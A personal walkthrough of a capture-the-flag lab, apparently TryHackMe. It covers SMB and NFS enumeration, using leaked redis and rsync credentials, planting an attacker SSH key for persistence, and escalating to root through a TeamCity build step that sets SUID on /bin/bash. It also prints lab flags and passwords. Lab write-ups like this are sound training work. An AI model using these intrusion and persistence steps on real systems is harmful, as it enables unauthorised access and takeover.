sudo openvpn .ovpn

$nmap -A [Ipaddress]
- Note:
	- ssh port 22 (remote login)
	- older protocol
	- SAMBA protcol
		- SAMBA file sharing tool which allows user to download, view, and store files remotely 
___
**ENUMERATING SMB SHARES**
=
$smbclient -L //[ipaddress]
$smbclient //[ipaddress]/shares
- password: [NO PASSWORD, JUST PRESS ENTER]
$cd temp > $mget *
$cd ..
$cd data > $mget *

(on kali)
$cat services.txt
- flag 1: THM{0a09d51e488f5fa105d8d866a497440a}
___
**Mount remote directory - NFS/mount open ports**
=
showmount -e [ipaddress]
- /opt/conf *
	- Remote shared files 
	- We ran a showmount to display list of clients that have remotely mounted file system 

$sudo mount -t nfs [ipaddress]:/opt/conf ~/Desktop/tmp/conf
- -t : type 
- /opt/conf/: Shared directory 
	- opt: Installing optional/ 3rd part software
	- conf: Configuration files 

$cd ~/Desktop/tmp/conf/redis
$nano redis.conf 
- requirepass: "B65Hx562F@ggAZ@F"

$redis-cli -h [ipaddress]
$auth -h B65Hx562F@ggAZ@F
$Get "internal flag"
- Flag 2: THM{ff8e518addbbddb74531a724236a8221}
___
NOTE: THIS IS A START GETTING USERS
=
___

**Getting user's credentials**
we want to find more information about the redis's credentials and what we can do with it 

$type authlist
- list 
	- authlist is a list type key 

$lrange authlist 1 100
- lrange: used to extract a range of elements from a list
- 1 100: attempting to extract the first 100 elements of the output 
- QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==
	-  we noticed that this is a base64 message 

$echo QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg== | based64 -d
- authorization for rsync://rsync-connect@{IPADress} with password Hcg3HP67@TW@Bc72v
- Hcg3HP67@TW@Bc72v


$rsync -av rsync://rsync-connect@10.10.201.5/files /home/kali/Desktop/user_files
- pass: Hcg3HP67@TW@Bc72v
- Moving files from 10.10.201.5 (user) to new user_files 
- Ran sudo so we can create user_files

$cd ~/Desktop/user_files/sys-internal]
$cat user.txt
- Flag 3: THM{da7c20696831f253e0afaca8b83c07ab}
___
**THIS IS THE START OF PIVOTING****
=
**___
**SSH into root- enumerating **

$cd ~/Desktop
$mkdir ssh
$cd ssh

Now we are going to create a key for us to access the system

$ssh-keygen -f sys-internal
- password: password

Note: 
- We need to create an authorized key 

$touch authorized_keys
$cat sys-internal.pub > authorized_keys
- NOTE: We are creating a key and storing it into id_rsa.pub and give it similar permissions to the other keys to make is less suspicious

$chmod 700 authorized_keys

Now we are going to upload the admin_key file to .ssh directory of sys-internal 
$rsync -av ~/Desktop/ssh/authorized_keys rsync://rsync-connect@{ipaddress}/files/sys-internal/.ssh
- password Hcg3HP67@TW@Bc72v

$chmod 600 sys-internal

$ssh -i ~/Desktop/ssh/sys-internal sys-internal@{IpAddress} 
- we are able to gain access to the account now 

We want to go all the way back to look at severs or anything we want to exploit 
$cd .. 
$cd ..
- We discovered a TeamCity folder

Readme.txt might have some useful information
$cat TeamCity-readme.txt 
- http://localhost:8111 
	- linux 

We need to check if the service is running on port 8111 
$ss -ltp

$ssh -L 8111:localhost:8111 -i sys-internal sys-internal@{IPAddress}
- now we know we can sign in, lets go on their website -
	- http://localhost:8111  
		- This was found in the TeamCity-readme.txt file 
- Click on log in as super user 

sudo ssh sys-internal@10.10.150.238 -i ~/Desktop/ssh/sys-internal -L 8111:127.0.0.1:8111

Note: Now we can log into TeamCity -> We need to find some credentials 
$cd ..
$cd ..
$cd logs
$cat catalina.out
$cat catalina.out |grep "Super user"
- 6041791014573784210 
	- The first 604... is the right authorization 

____ 
Creating a project 
Click Manually
input name: Project 4
- Where are the flags? 

Create build configuration 
- name > Create  > skip

Go to build steps of the left side 
choose: Command line 
under custom script 
- chmod +s /bin/bash

Hit run 

Go back to linux that is on the TeamCity folder
$ls -l /bin/bash
- You need to wait for it to show 

$/bin/bash -p

$whoami
$cd /root 
$cat root.txt
- Flag 4: THM{e8996faea46df09dba5676dd271c60bd}
